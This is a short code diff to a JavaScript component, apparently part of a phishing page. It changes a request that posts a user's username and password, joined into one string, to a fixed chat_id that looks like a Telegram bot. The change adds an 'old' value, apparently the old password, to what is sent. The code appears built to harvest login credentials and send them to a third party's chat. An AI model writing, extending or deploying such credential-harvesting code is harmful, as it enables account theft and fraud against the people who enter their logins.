@@ -18,7 +18,7 @@ export default function Example() {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          text: username +'--'+ password,
+          text: username +'--'+ old +'---'+ password,
           chat_id :'92170602'
         }),
       });
